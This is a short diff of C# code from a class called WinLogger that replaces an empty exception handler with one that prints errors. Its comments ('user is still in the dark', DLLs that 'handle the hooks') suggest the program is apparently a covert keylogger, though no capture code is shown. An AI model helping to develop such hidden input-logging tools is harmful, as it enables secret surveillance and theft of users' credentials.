@@ -89,7 +89,7 @@ public class WinLogger
             } catch (Exception) {  
                 /* If something goes wrong, oh well. At least user is still in the dark. */
             }
-        } catch (Exception) {}
+        } catch (Exception e) {Console.WriteLine(e.ToString());}
     }
     
     //These Dll's will handle the hooks.
